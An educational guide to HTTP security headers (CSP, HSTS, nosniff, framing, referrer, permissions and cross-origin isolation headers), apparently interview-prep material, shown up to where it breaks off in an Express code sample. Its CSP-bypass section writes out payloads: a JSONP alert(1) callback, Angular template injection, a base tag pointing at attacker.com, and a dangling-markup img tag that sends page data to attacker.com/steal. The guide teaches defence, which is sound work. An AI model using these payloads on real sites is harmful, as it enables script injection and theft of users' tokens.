# Security Headers - Comprehensive Guide

## At a glance

**HTTP Security Headers** are response headers that instruct browsers to enforce security policies on behalf of the server. They form a **browser-enforced defense-in-depth layer** that mitigates entire classes of attacks—XSS, clickjacking, MIME confusion, protocol downgrade, cross-origin data leaks—without changing application logic. A missing or misconfigured header can silently disable a critical protection. Interviews test whether you understand **what each header does, why it exists, how to deploy it safely, and where it fails**.

---

## Learning outcomes

- Explain the purpose and directives of **CSP**, **HSTS**, **X-Content-Type-Options**, **X-Frame-Options**, **Referrer-Policy**, **Permissions-Policy**, and the **cross-origin isolation** headers (COOP, COEP, CORP).
- Differentiate between headers that are **still relevant**, **deprecated**, or **dangerous** (X-XSS-Protection, HPKP, Expect-CT).
- Design a **deployment strategy** for security headers on a production application, including report-only rollouts and iterative tightening.
- Identify **common misconfigurations** and **bypass techniques** that interviewers probe at senior and staff levels.

---

## Prerequisites

HTTP fundamentals, Same-Origin Policy, XSS basics, TLS concepts, Browser DevTools familiarity (this repo).

---

## Introduction

### What are HTTP security headers and why they matter

HTTP security headers are **response headers** set by the server that tell the browser to activate or configure built-in security mechanisms. Unlike server-side defenses (input validation, parameterized queries), security headers operate **at the browser layer**—they constrain what the browser is willing to do with the response it receives.

They matter because:

- **Browsers are the execution environment** for web applications. A single injected script runs with the full authority of the page's origin.
- **Server-side defenses are necessary but not sufficient.** Even with perfect output encoding, a misconfigured CDN or third-party widget can introduce scripts. Headers like CSP provide a safety net.
- **They are cheap to deploy.** Adding a header is a configuration change, not a code rewrite. The security ROI is enormous.
- **They are tested in audits and pentests.** Missing headers are among the most common findings in security assessments.

### Defense-in-depth: headers as a browser-enforced security layer

Defense-in-depth means no single control is trusted to stop all attacks. Security headers add a **client-side enforcement layer** on top of server-side controls:

| Layer | Example Control |
|-------|----------------|
| **Input validation** | Reject `<script>` in form fields |
| **Output encoding** | HTML-encode user data before rendering |
| **Security headers** | CSP blocks inline scripts even if encoding is missed |
| **Cookie flags** | HttpOnly prevents JS access to session cookies even if XSS fires |

If output encoding fails on one page, CSP can still block the injected script. If CSP has a gap, HttpOnly cookies prevent session theft. Each layer compensates for failures in the others.

### Response headers vs request headers in security context

- **Response headers** (server → browser): These are the "security headers" we discuss. The server tells the browser what policies to enforce. Examples: `Content-Security-Policy`, `Strict-Transport-Security`, `X-Frame-Options`.
- **Request headers** (browser → server): These carry context the server can use to make decisions. Examples: `Origin` (used in CORS decisions), `Referer` (used for CSRF checks), `Cookie` (carries session tokens). The server doesn't "enforce" these in the browser—it reads them.

The distinction matters because security headers are **directives from the server to the browser**. The browser is the enforcement point. If the browser doesn't support a header, the protection doesn't exist—which is why **knowing browser support** is part of a deployment strategy.

---

## Content-Security-Policy (CSP)

CSP is the most powerful and complex security header. It defines a **whitelist of trusted content sources** that the browser enforces, blocking anything not explicitly allowed.

### What CSP Does

- **Controls which resources the browser is allowed to load**: scripts, styles, images, fonts, frames, network connections, and more.
- **Mitigates XSS**: Even if an attacker injects `<script>alert(1)</script>` into your HTML, the browser refuses to execute it unless inline scripts are explicitly allowed.
- **Mitigates data injection**: Prevents loading malicious resources from attacker-controlled domains.
- **Mitigates clickjacking**: The `frame-ancestors` directive controls who can embed your page, replacing `X-Frame-Options`.
- **Provides violation reporting**: CSP can report blocked resources to a server endpoint, giving visibility into attacks and misconfigurations.

**Basic example:**

```
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com; style-src 'self' 'unsafe-inline'; img-src *; report-uri /csp-report
```

This policy says: load scripts only from my origin and `cdn.example.com`, allow inline styles (not ideal but common), allow images from anywhere, and report violations to `/csp-report`.

### CSP Directives (detailed)

Each directive controls a specific resource type. If a directive is not specified, it falls back to `default-src`. If `default-src` is also missing, the browser allows everything (no protection).

#### default-src

The fallback for all fetch directives not explicitly listed. Set this to `'self'` or `'none'` as a baseline and then open specific directives as needed.

```
Content-Security-Policy: default-src 'none'; script-src 'self'; style-src 'self'; img-src 'self'; connect-src 'self'
```

**Best practice**: Start with `default-src 'none'` and explicitly allow each resource type. This ensures you don't accidentally permit a resource type you forgot about.

#### script-src

Controls JavaScript sources. The most security-critical directive because script execution gives full control over the page.

```
Content-Security-Policy: script-src 'self' https://cdn.example.com 'nonce-abc123'
```

- `'self'`: Scripts from the same origin.
- Specific domains: `https://cdn.example.com`.
- Nonces: `'nonce-abc123'` allows a specific `<script nonce="abc123">` tag.
- Hashes: `'sha256-base64hash'` allows scripts whose content matches the hash.

**Sub-directives:**
- `script-src-elem`: Controls `<script>` elements specifically.
- `script-src-attr`: Controls inline event handlers (`onclick`, `onload`, etc.).

#### style-src

Controls CSS sources. CSS injection can be used for data exfiltration (e.g., using attribute selectors to leak CSRF tokens character by character).

```
Content-Security-Policy: style-src 'self' 'nonce-xyz789'
```

**Sub-directives:**
- `style-src-elem`: Controls `<style>` elements and `<link rel="stylesheet">`.
- `style-src-attr`: Controls inline `style=""` attributes.

#### img-src

Controls image sources. Usually more permissive since images have less attack surface, but consider:
- Images from `data:` URIs can be used for tracking pixels.
- Images can trigger requests to attacker servers (beaconing).

```
Content-Security-Policy: img-src 'self' https://images.example.com data:
```

#### font-src

Controls web font sources. Fonts are typically loaded from CDNs or self-hosted.

```
Content-Security-Policy: font-src 'self' https://fonts.gstatic.com
```

#### connect-src

Controls targets for `fetch()`, `XMLHttpRequest`, `WebSocket`, `EventSource`, and `navigator.sendBeacon()`. Critical for preventing data exfiltration via XSS—even if an attacker executes script, they can't send stolen data if `connect-src` is restrictive.

```
Content-Security-Policy: connect-src 'self' https://api.example.com wss://ws.example.com
```

#### media-src

Controls `<audio>` and `<video>` sources.

```
Content-Security-Policy: media-src 'self' https://media.example.com
```

#### object-src

Controls `<object>`, `<embed>`, and `<applet>` sources. **Always set to `'none'`** unless you specifically need Flash or Java applets (you don't).

```
Content-Security-Policy: object-src 'none'
```

This prevents plugin-based attacks. Flash and Java plugins have been historically massive attack surfaces.

#### frame-src

Controls sources for `<iframe>` and `<frame>` elements. Determines what your page can embed.

```
Content-Security-Policy: frame-src 'self' https://www.youtube.com https://player.vimeo.com
```

#### frame-ancestors

Controls **who can embed your page** in an `<iframe>`. This is the **CSP replacement for X-Frame-Options** and is more flexible.

```
Content-Security-Policy: frame-ancestors 'self' https://trusted-parent.com
```

- `'none'` = equivalent to `X-Frame-Options: DENY`
- `'self'` = equivalent to `X-Frame-Options: SAMEORIGIN`
- Specific origins = more flexible than `X-Frame-Options: ALLOW-FROM` (which only supported one origin)

**Important**: `frame-ancestors` is **not** affected by `default-src`. It must be explicitly set.

#### base-uri

Controls what URLs can be used in `<base href="...">`. An attacker who can inject a `<base>` tag can redirect all relative URLs on the page to their server.

```
Content-Security-Policy: base-uri 'self'
```

**Always set to `'self'` or `'none'`**. This closes the base-uri hijacking attack vector.

#### form-action

Controls where `<form>` elements can submit data. Without this, an attacker who injects a form can submit data to their server.

```
Content-Security-Policy: form-action 'self' https://payment.example.com
```

#### navigate-to

Controls where the document can navigate (via `window.location`, `<a href>`, `<form action>`, `<meta http-equiv="refresh">`). Still experimental and not widely supported.

```
Content-Security-Policy: navigate-to 'self' https://example.com
```

#### worker-src

Controls sources for `Worker`, `SharedWorker`, and `ServiceWorker`. Workers run in their own context and can make network requests, so they need their own policy.

```
Content-Security-Policy: worker-src 'self' blob:
```

Falls back to `child-src`, then `script-src`, then `default-src`.

#### child-src

Controls sources for web workers and nested browsing contexts (iframes). In practice, use `frame-src` and `worker-src` for more granular control.

```
Content-Security-Policy: child-src 'self'
```

#### manifest-src

Controls sources for application manifests (`<link rel="manifest">`).

```
Content-Security-Policy: manifest-src 'self'
```

### Source Values

Source values define what each directive allows. Understanding the security trade-offs of each value is critical.

#### 'self'

Allows resources from the **same origin** (scheme + host + port). This is the most common starting point for most directives.

```
script-src 'self'
```

**Trade-off**: Safe baseline, but doesn't help if your own origin serves user-controlled content (e.g., file upload endpoints that serve HTML).

#### 'none'

Blocks all resources of this type. Use for `object-src`, `base-uri`, and any directive where you don't need the resource type.

```
object-src 'none'
```

#### 'unsafe-inline'

Allows inline `<script>` tags, `<style>` tags, and inline event handlers (`onclick`, etc.). **This largely defeats the purpose of CSP for XSS protection** because most XSS payloads are inline scripts.

```
script-src 'self' 'unsafe-inline'
```

**When it's used**: Legacy applications with thousands of inline scripts where migration is impractical in the short term. Should be treated as **technical debt** to eliminate.

**Trade-off**: Convenient but eliminates CSP's core XSS protection. Use nonces or hashes instead.

#### 'unsafe-eval'

Allows `eval()`, `Function()`, `setTimeout('string')`, and `setInterval('string')`. These are dangerous because they convert strings to code.

```
script-src 'self' 'unsafe-eval'
```

**When it's used**: Some template engines and libraries (Angular.js 1.x, some charting libraries) require eval. Consider alternatives or use `'unsafe-eval'` only when absolutely necessary.

**Trade-off**: Opens a path from string injection to code execution. Avoid when possible.

#### 'unsafe-hashes'

Allows specific inline event handlers by their hash, without allowing all inline scripts. More targeted than `'unsafe-inline'` but only works for event handler attributes.

```
script-src 'unsafe-hashes' 'sha256-abc123...'
```

This allows `<button onclick="doSomething()">` if the hash of `doSomething()` matches, without opening up all inline scripts.

#### 'strict-dynamic'

Tells the browser: "Trust scripts loaded by already-trusted scripts." If a script was loaded via a nonce or hash, any scripts it dynamically loads (via `document.createElement('script')`) are also trusted, regardless of their source.

```
script-src 'nonce-abc123' 'strict-dynamic'
```

**Why it matters**: Modern applications use bundlers that dynamically load chunks. Without `strict-dynamic`, you'd need to whitelist every CDN and chunk URL. With it, you only need to nonce the initial `<script>` tag.

**Behavior**: When `'strict-dynamic'` is present, host-based allowlists (`https://cdn.example.com`) and `'self'` are **ignored** for script loading. Only nonces, hashes, and dynamically loaded scripts are trusted.

#### 'nonce-...'

A server-generated random value that must match between the CSP header and the `<script>` tag. Each page load must use a **new, cryptographically random nonce**.

**Header:**
```
Content-Security-Policy: script-src 'nonce-4AEemGb0xJptoIGFP3Nd'
```

**HTML:**
```html
<script nonce="4AEemGb0xJptoIGFP3Nd">
  // This script runs because the nonce matches
</script>
```

**Requirements**: The nonce must be at least 128 bits of entropy, base64-encoded. It must change on every response. If the nonce is predictable or reused, an attacker who can inject HTML can also inject scripts with the correct nonce.

#### 'sha256-...' (hash-based)

Allows scripts whose content hashes to a specific value. The browser computes the hash of the inline script body and compares it to the allowed hash.

```
Content-Security-Policy: script-src 'sha256-B2yPHKaXnvFWtRChIbabYmUBFZdVfKKXHbWtWidDVF8='
```

**Generating the hash:**
```bash
echo -n "alert('hello')" | openssl dgst -sha256 -binary | openssl base64
```

**Trade-off**: Hashes are great for static inline scripts that never change. But if the script content changes (different data, different state), the hash changes and the script breaks. Nonces are more flexible for dynamic content.

#### data:

Allows `data:` URIs. Common for inline images (`<img src="data:image/png;base64,...">`) but **dangerous for scripts**.

```
img-src 'self' data:
```

**Never use `data:` in `script-src`** — it allows `<script src="data:text/javascript,alert(1)">`.

#### blob:

Allows `blob:` URIs. Needed for workers created from blob URLs and for `URL.createObjectURL()` patterns.

```
worker-src 'self' blob:
```

#### https:

Allows any resource served over HTTPS, regardless of domain. **Very broad** and should be avoided for `script-src` (it allows scripts from any HTTPS site).

```
img-src https:
```

May be acceptable for images if you need to embed images from arbitrary HTTPS sources, but not for scripts.

#### Specific domains

Allows resources from specific origins or domains.

```
script-src https://cdn.example.com https://analytics.example.com
```

**Wildcards**: `*.example.com` allows all subdomains. Be careful — if any subdomain serves user content, they can host malicious scripts.

### CSP Deployment Strategy

Deploying CSP on a real application is an iterative process. Flipping on a strict policy immediately will break functionality.

#### Step 1: Report-Only mode

Start with `Content-Security-Policy-Report-Only` instead of `Content-Security-Policy`. This header tells the browser to **report violations but not block them**. Your application works normally while you collect data.

```
Content-Security-Policy-Report-Only: default-src 'self'; script-src 'self'; report-uri /csp-report
```

Monitor the reports for 1-4 weeks. Every violation represents something your policy would block if enforced.

#### Step 2: report-uri and report-to

**report-uri** (older, widely supported):
```
Content-Security-Policy: ...; report-uri /csp-report
```

The browser sends a JSON POST to `/csp-report` with details:
```json
{
  "csp-report": {
    "document-uri": "https://example.com/page",
    "violated-directive": "script-src 'self'",
    "blocked-uri": "https://evil.com/malicious.js",
    "original-policy": "default-src 'self'; script-src 'self'"
  }
}
```

**report-to** (newer, uses Reporting API):
```
Report-To: {"group":"csp","max_age":86400,"endpoints":[{"url":"/csp-report"}]}
Content-Security-Policy: ...; report-to csp
```

Use both for maximum browser coverage during the transition period.

#### Step 3: Iterative tightening

1. **Audit violations**: Group by `blocked-uri` and `violated-directive`.
2. **Legitimate resources**: Add them to the policy (e.g., your CDN, analytics provider).
3. **Inline scripts**: Refactor to external files, or add nonces/hashes.
4. **Third-party scripts**: Evaluate whether they're necessary. Each one increases your attack surface.
5. **Enforce**: Move from `Content-Security-Policy-Report-Only` to `Content-Security-Policy`. Keep `report-uri` for ongoing monitoring.
6. **Tighten further**: Remove `'unsafe-inline'`, reduce domain allowlists, adopt `'strict-dynamic'`.

#### Nonce-based vs hash-based vs strict-dynamic approaches

| Approach | Best for | Limitation |
|----------|----------|------------|
| **Nonce-based** | Dynamic pages (SSR) where the server controls HTML | Requires server-side nonce generation on every response; doesn't work with static HTML caching |
| **Hash-based** | Static inline scripts that never change | Any script content change requires updating the CSP header hash |
| **strict-dynamic** | SPAs and apps with dynamically loaded script chunks | Ignores host-based allowlists; requires nonce or hash on bootstrap script |

**Recommended modern approach** (Google's recommended CSP):

```
Content-Security-Policy: script-src 'nonce-{random}' 'strict-dynamic'; object-src 'none'; base-uri 'self'
```

This is simple, effective, and works well with modern JavaScript bundlers. The nonce trusts the initial script; `strict-dynamic` trusts scripts loaded by that initial script; `object-src 'none'` blocks plugins; `base-uri 'self'` prevents base-tag hijacking.

#### Common pitfalls

- **Inline event handlers** (`onclick="..."`) are blocked by CSP unless `'unsafe-inline'` is allowed. Refactor to `addEventListener()`.
- **Inline styles** in JavaScript frameworks (e.g., React's `style` prop with object literals that use doubled curly braces) may require `'unsafe-inline'` in `style-src` or nonces.
- **Third-party scripts** (analytics, ads, chat widgets) load additional scripts dynamically. Without `strict-dynamic`, you'd need to whitelist every domain they load from — and those domains change.
- **eval() usage** by libraries (e.g., some template engines, Webpack dev mode) requires `'unsafe-eval'`, which weakens CSP.
- **CSP on cached pages**: If you cache HTML with a nonce, the nonce in the HTML won't match the nonce in the CSP header of subsequent responses. Use hashes for cached content or configure cache keys to include the nonce.

### CSP Bypass Techniques (for interview awareness)

Understanding bypasses is critical for senior/staff interviews and for designing robust policies.

#### JSONP endpoints as script sources

If your CSP allows `https://trusted.example.com` and that domain has a JSONP endpoint, an attacker can use it to execute arbitrary JavaScript:

```html
<script src="https://trusted.example.com/api/data?callback=alert(1)//"></script>
```

The JSONP response is `alert(1)//({"data":"..."})`, which is valid JavaScript. **Mitigation**: Don't whitelist domains that serve JSONP. Use `strict-dynamic` with nonces instead of domain allowlists.

#### Angular/React template injection within allowed domains

If a CSP allows a CDN that hosts Angular.js, an attacker can inject Angular template syntax within the page:

{% raw %}
```html
<div ng-app>
  {{constructor.constructor('alert(1)')()}}
</div>
<script src="https://allowed-cdn.com/angular.min.js"></script>
```
{% endraw %}

Angular evaluates the double-curly template expression, bypassing CSP because the script came from an allowed domain. **Mitigation**: Use `strict-dynamic` with nonces; avoid domain-based allowlists for `script-src`.

#### base-uri hijacking

If `base-uri` is not restricted, an attacker who can inject HTML (but not scripts) can inject:

```html
<base href="https://attacker.com/">
```

All relative script URLs (`<script src="/app.js">`) now resolve to `https://attacker.com/app.js`. **Mitigation**: Always set `base-uri 'self'` or `base-uri 'none'`.

#### Dangling markup injection

When an attacker can inject HTML but not execute scripts (due to CSP), they can use "dangling markup" to exfiltrate data:

```html
<img src="https://attacker.com/steal?data=
```

If the injected `<img>` tag is unclosed, the browser includes everything after it (up to the next `"` or `>`) as part of the `src` attribute, sending page content (potentially including CSRF tokens) to the attacker's server.

**Mitigation**: Output encoding prevents the injection. CSP with restricted `img-src` limits exfiltration targets. Chrome also blocks `<a>` and `<img>` URLs containing newlines in certain contexts as a dangling markup mitigation.

---

## Strict-Transport-Security (HSTS)

### Purpose

HSTS tells the browser: **"Never communicate with this domain over plain HTTP. Always use HTTPS."** After seeing the HSTS header, the browser automatically upgrades all HTTP requests to HTTPS for that domain, even if the user types `http://` or clicks an `http://` link.

### Syntax

```
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

| Directive | Purpose |
|-----------|---------|
| `max-age=<seconds>` | How long the browser should remember to force HTTPS. `31536000` = 1 year. |
| `includeSubDomains` | Applies HSTS to all subdomains. Critical for preventing subdomain downgrade attacks. |
| `preload` | Signals intent to be included in browser HSTS preload lists. |

### HSTS preload list and how to submit

The **HSTS preload list** is a list of domains hardcoded into browsers (Chrome, Firefox, Safari, Edge) that are HTTPS-only from the first connection. This eliminates the "first visit vulnerability."

**Submitting to the preload list:**

1. Serve a valid HSTS header with `max-age` >= 1 year, `includeSubDomains`, and `preload`.
2. Serve HTTPS on the bare domain (not just `www`).
3. Redirect all HTTP traffic to HTTPS.
4. Submit at [hstspreload.org](https://hstspreload.org).

```
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
```

### First-visit vulnerability

Without preloading, the **first time** a user visits your site, there's no HSTS policy cached. If the user connects over HTTP first (e.g., typing `example.com` in the address bar), an attacker on the network can intercept that initial HTTP request before the redirect to HTTPS.

This is the basis for **SSL stripping attacks** (sslstrip tool). The attacker intercepts the HTTP connection, proxies to the real HTTPS site, and the user never sees HTTPS.

**HSTS preloading eliminates this** because the browser knows to use HTTPS before ever contacting the server.

### Risks

- **Lock-out if HTTPS breaks**: If your TLS certificate expires or your HTTPS configuration breaks, users cannot access your site over HTTP either. With a long `max-age`, they're locked out for the duration. **Mitigation**: Start with a short `max-age` (e.g., 300 seconds) and increase gradually as confidence grows.
- **Subdomain implications**: With `includeSubDomains`, every subdomain must support HTTPS. If you have a legacy subdomain on HTTP, it becomes inaccessible. Audit all subdomains before enabling.
- **Preload is hard to reverse**: Removing a domain from the preload list takes months (browser release cycles). Don't preload until you're certain about HTTPS for the entire domain and all subdomains.

### Relationship to certificate pinning (deprecated)

HPKP (HTTP Public Key Pinning) was a header that pinned specific certificate public keys. It was **deprecated and removed** because:
- Mistakes could **permanently lock users out** of a site (a "bricking" attack).
- Attackers who compromised a site could set HPKP to pin their own key, creating a **ransom** scenario.
- Certificate Transparency (CT) logs provide a better solution for detecting misissued certificates.

HSTS remains the standard; HPKP is gone. Use CT monitoring instead of pinning.

---

## X-Content-Type-Options

### MIME sniffing attacks explained

Browsers historically tried to be "helpful" by guessing the content type of a response, ignoring the `Content-Type` header. This is called **MIME sniffing**. If a server sets `Content-Type: text/plain` but the content looks like HTML, older browsers would render it as HTML.

This creates an attack: upload a file with a `.txt` or `.jpg` extension that contains HTML/JavaScript. The server serves it with an image or text Content-Type, but the browser sniffs the content and executes the HTML/JavaScript.

### The nosniff directive

```
X-Content-Type-Options: nosniff
```

This tells the browser: **"Trust the Content-Type header. Do not sniff."** If the server says the content is `text/plain`, render it as plain text, even if it looks like HTML.

Specifically, `nosniff` blocks:
- **Script loading** when the MIME type is not a JavaScript MIME type.
- **Style loading** when the MIME type is not a CSS MIME type.

### Why browsers sniff content types

Historical reasons: early web servers frequently misconfigured Content-Type headers. Browsers sniffed to improve compatibility. Modern servers and frameworks set correct types, making sniffing unnecessary and dangerous.

### Real attack scenarios

**Scenario 1: Image upload with HTML content**

1. User uploads `profile.jpg` containing `<html><script>alert(document.cookie)</script></html>`.
2. Server stores it and serves it with `Content-Type: image/jpeg`.
3. Browser sniffs the content, determines it's actually HTML, and renders/executes it.
4. The script runs in the context of the upload domain — if that's the same origin as the application, it's XSS.

**Scenario 2: API response reinterpretation**

1. An API returns JSON: `Content-Type: application/json`.
2. An attacker crafts a JSON response that is also valid JavaScript.
3. Without `nosniff`, a browser navigating directly to the API endpoint might execute the response as a script.

**Always set `X-Content-Type-Options: nosniff`**. There is no downside to setting it on every response.

---

## X-Frame-Options

### Clickjacking attack explained

Clickjacking (UI redressing) tricks a user into clicking something they didn't intend to by overlaying a transparent iframe of a target site over a decoy page:

1. Attacker creates a page with a button: "Click here to win a prize!"
2. The attacker overlays a transparent `<iframe>` of `https://bank.com/transfer?to=attacker&amount=10000` positioned so the "Confirm Transfer" button aligns with the "win a prize" button.
3. The user clicks what they think is the prize button but actually clicks the bank's transfer button.
4. Because the user is logged into the bank, the request succeeds with their session cookie.

### Directives

```
X-Frame-Options: DENY
```

| Value | Behavior |
|-------|----------|
| `DENY` | Page cannot be displayed in any iframe, ever |
| `SAMEORIGIN` | Page can only be iframed by pages from the same origin |
| `ALLOW-FROM https://trusted.com` | Page can only be iframed by the specified origin (**deprecated, not supported in modern browsers**) |

### Deprecation in favor of CSP frame-ancestors

`X-Frame-Options` has limitations:
- `ALLOW-FROM` only supports a single origin and is not supported by Chrome or Safari.
- It can't express "allow these three specific origins."
- It doesn't support wildcards.

CSP `frame-ancestors` replaces it with full flexibility:

```
Content-Security-Policy: frame-ancestors 'self' https://partner1.com https://partner2.com
```

### When to still use X-Frame-Options

- **Legacy browser support**: Very old browsers (IE11 and earlier) support `X-Frame-Options` but not CSP `frame-ancestors`.
- **Belt and suspenders**: Set both for maximum compatibility:

```
X-Frame-Options: SAMEORIGIN
Content-Security-Policy: frame-ancestors 'self'
```

If both are present, modern browsers prefer CSP `frame-ancestors` and ignore `X-Frame-Options`.

---

## Referrer-Policy

### What referrer information leaks

When a user navigates from page A to page B, the browser sends a `Referer` header (yes, the misspelling is intentional — it's in the HTTP spec) containing the URL of page A. This can leak:

- **URL path**: `/user/profile/12345` reveals user IDs.
- **Query parameters**: `/search?q=medical+condition` reveals search queries.
- **Tokens in URLs**: `/reset-password?token=abc123` leaks password reset tokens.
- **Internal URLs**: Navigating from an internal admin page to an external link reveals internal URL structure.

### Policy values

```
Referrer-Policy: strict-origin-when-cross-origin
```

| Policy | Same-origin request | Cross-origin (HTTPS→HTTPS) | Downgrade (HTTPS→HTTP) |
|--------|---------------------|---------------------------|----------------------|
| `no-referrer` | No referrer | No referrer | No referrer |
| `no-referrer-when-downgrade` | Full URL | Full URL | No referrer |
| `origin` | Origin only | Origin only | Origin only |
| `origin-when-cross-origin` | Full URL | Origin only | Origin only |
| `same-origin` | Full URL | No referrer | No referrer |
| `strict-origin` | Origin only | Origin only | No referrer |
| `strict-origin-when-cross-origin` | Full URL | Origin only | No referrer |
| `unsafe-url` | Full URL | Full URL | Full URL |

- **"Full URL"** = `https://example.com/path?query=value`
- **"Origin only"** = `https://example.com`
- **"No referrer"** = `Referer` header not sent

### Privacy vs analytics trade-offs

- **`no-referrer`**: Maximum privacy but breaks analytics (you can't see where traffic comes from) and can break some CSRF protections that check the Referer header.
- **`strict-origin-when-cross-origin`**: Good balance — same-origin requests get full URL (your own analytics work), cross-origin gets only the origin (external sites see you exist but not the full path), and downgrades get nothing.
- **`unsafe-url`**: Maximum analytics data but leaks full URLs everywhere, including sensitive paths and query parameters.

### Default behavior in modern browsers

Modern browsers (Chrome 85+, Firefox 87+, Safari 14+) default to **`strict-origin-when-cross-origin`** when no Referrer-Policy header is set. This is a good default, but explicitly setting it is still recommended for clarity and for older browsers.

---

## Permissions-Policy (formerly Feature-Policy)

### Controlling browser APIs

Permissions-Policy allows a site to control which browser features and APIs can be used by its own code and by embedded third-party iframes.

```
Permissions-Policy: camera=(), microphone=(), geolocation=(self), payment=(self "https://payment.example.com"), fullscreen=(self), autoplay=()
```

### Key features you can control

| Feature | What it controls |
|---------|-----------------|
| `camera` | Access to camera devices |
| `microphone` | Access to microphone |
| `geolocation` | GPS/location access |
| `payment` | Payment Request API |
| `fullscreen` | Fullscreen API |
| `autoplay` | Media autoplay |
| `display-capture` | Screen capture API |
| `encrypted-media` | Encrypted Media Extensions (DRM) |
| `picture-in-picture` | Picture-in-picture mode |
| `accelerometer` | Device accelerometer |
| `gyroscope` | Device gyroscope |
| `magnetometer` | Device magnetometer |
| `usb` | WebUSB API |
| `bluetooth` | Web Bluetooth API |
| `serial` | Web Serial API |
| `hid` | WebHID API |

### Syntax

```
Permissions-Policy: feature=(allowlist)
```

| Allowlist value | Meaning |
|----------------|---------|
| `()` | Disabled for all contexts (equivalent to `'none'`) |
| `(self)` | Allowed for same-origin only |
| `(*)` | Allowed for all origins |
| `(self "https://trusted.com")` | Allowed for same-origin and specified origins |

### Iframe feature delegation

When embedding third-party content in iframes, the iframe inherits the parent page's permissions restrictions. You can also use the `allow` attribute on iframes:

```html
<iframe src="https://maps.example.com" allow="geolocation 'self' https://maps.example.com"></iframe>
```

If the parent page's Permissions-Policy blocks `geolocation`, the iframe cannot use it even if the `allow` attribute permits it. The parent policy is the ceiling.

### Privacy and security benefits

- **Reduces attack surface**: Even if a third-party script is compromised, it can't access the camera or microphone if the policy blocks it.
- **Prevents abuse by embedded content**: Ad iframes can't use the vibration API, request payment, or access sensors.
- **Defense against future APIs**: New browser APIs are designed to respect Permissions-Policy, so setting a restrictive baseline protects against features you haven't heard of yet.

---

## Cross-Origin Headers (COOP, COEP, CORP)

These three headers work together to enable **cross-origin isolation**, which is required for powerful features like `SharedArrayBuffer` and high-resolution timers (which were restricted after Spectre/Meltdown).

### Cross-Origin-Opener-Policy (COOP)

#### Browsing context isolation

By default, when your page opens a popup (`window.open()`) or is opened as a popup, the opener and the opened page share a **browsing context group**. They can reference each other via `window.opener` and `window.open()` return values.

COOP breaks this relationship for cross-origin windows, preventing cross-origin pages from referencing your window object.

```
Cross-Origin-Opener-Policy: same-origin
```

#### Values

| Value | Behavior |
|-------|----------|
| `same-origin` | Window is isolated from cross-origin openers/openees. `window.opener` is `null` for cross-origin. |
| `same-origin-allow-popups` | Allows your page to still reference popups it opens, but cross-origin pages can't reference your page. |
| `unsafe-none` | Default behavior. No isolation (backward compatible). |

#### Spectre/Meltdown mitigations

Spectre-class attacks can read arbitrary memory within a process. If a cross-origin page shares a process with your page (via browsing context groups), Spectre could read your page's data. COOP ensures cross-origin pages are in **separate processes**, eliminating this vector.

### Cross-Origin-Embedder-Policy (COEP)

#### Values and purpose

```
Cross-Origin-Embedder-Policy: require-corp
```

| Value | Behavior |
|-------|----------|
| `require-corp` | Only load cross-origin resources that explicitly opt in (via CORP header or CORS). |
| `credentialless` | Load cross-origin resources without sending credentials (cookies, client certs). Resources that require authentication won't load. |
| `unsafe-none` | Default. No restriction. |

#### Enabling SharedArrayBuffer

`SharedArrayBuffer` allows shared memory between the main thread and web workers, enabling high-performance computing in the browser. However, shared memory can be used to build high-resolution timers, which are essential for Spectre attacks.

To use `SharedArrayBuffer`, a page must be **cross-origin isolated**, which requires both:
```
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Embedder-Policy: require-corp
```

You can check isolation status in JavaScript:
```javascript
if (crossOriginIsolated) {
  // SharedArrayBuffer is available
  const buffer = new SharedArrayBuffer(1024);
}
```

### Cross-Origin-Resource-Policy (CORP)

#### Protecting resources from cross-origin reads

CORP is set on **individual resources** (images, scripts, etc.) to control who can load them. It's the resource's opt-in that COEP checks.

```
Cross-Origin-Resource-Policy: same-origin
```

| Value | Who can load the resource |
|-------|--------------------------|
| `same-origin` | Only pages from the same origin |
| `same-site` | Pages from the same site (same registrable domain, e.g., `a.example.com` can load from `b.example.com`) |
| `cross-origin` | Any page (opt-in to being embedded by cross-origin pages with COEP) |

**Use case**: Your CDN serves images. You set `Cross-Origin-Resource-Policy: cross-origin` on them so they can be loaded by pages that have COEP enabled. But your internal API responses should have `Cross-Origin-Resource-Policy: same-origin` to prevent cross-origin reads.

---

## Deprecated and Removed Headers

### X-XSS-Protection

```
X-XSS-Protection: 1; mode=block
```

**What it did**: Activated the browser's built-in XSS filter (XSS Auditor in Chrome, XSS Filter in IE).

**Why it was removed**:
- **False positives**: The filter sometimes blocked legitimate content, breaking sites.
- **It caused new vulnerabilities**: Researchers demonstrated that the XSS Auditor could be weaponized. In `mode=block`, an attacker could use the filter to detect whether specific content existed on a page (information leakage via timing). In filter mode (without `mode=block`), the auditor's selective removal of "dangerous" content could be manipulated to change page behavior in attacker-beneficial ways.
- **CSP is strictly superior**: CSP provides much more granular and reliable XSS protection.

**Current recommendation**: Set `X-XSS-Protection: 0` to explicitly **disable** the filter in any legacy browsers that still have it. Do not set it to `1`. Rely on CSP instead.

### Expect-CT

```
Expect-CT: max-age=86400, enforce, report-uri="https://example.com/ct-report"
```

**What it did**: Required the server's TLS certificate to appear in Certificate Transparency (CT) logs. If the certificate wasn't logged, the browser would reject the connection.

**Why it's obsolete**: All publicly trusted Certificate Authorities are now required to log all certificates in CT logs. Browsers (Chrome since 2018) enforce CT for all certificates by default. The header is no longer needed because CT enforcement is universal.

### Public-Key-Pins (HPKP)

```
Public-Key-Pins: pin-sha256="base64hash"; pin-sha256="backup-base64hash"; max-age=5184000
```

**What it did**: Pinned specific public key hashes for the site's certificate chain. The browser would only accept connections using certificates with matching key hashes.

**Why it was dangerous**:
- **Self-inflicted DoS**: If you lost your pinned key (e.g., CA revoked your cert, HSM failure), users were locked out for the `max-age` duration. With a `max-age` of months, this was catastrophic.
- **RansomPins attack**: An attacker who compromised your server temporarily could set HPKP pins to their own keys, then demand ransom to release the pins — your legitimate certificates would be rejected by all browsers that cached the pins.
- **Operational nightmare**: Key rotation required careful coordination with the pin list. Many teams got it wrong.

**Replacement**: Certificate Transparency (CT) monitoring achieves the goal (detecting misissued certificates) without the bricking risk.

---

## Security Headers in Practice

### Implementation by Platform

#### Express.js / Node.js (with helmet.js)

[Helmet](https://helmetjs.github.io/) is the standard middleware for setting security headers in Express applications.

```javascript
const express = require('express');
const helmet = require('helmet');
const crypto = require('crypto');

const app = express();

app.use((req, res, next) => {
  res.locals.cspNonce = crypto.randomBytes(32).toString('base64');
  next();
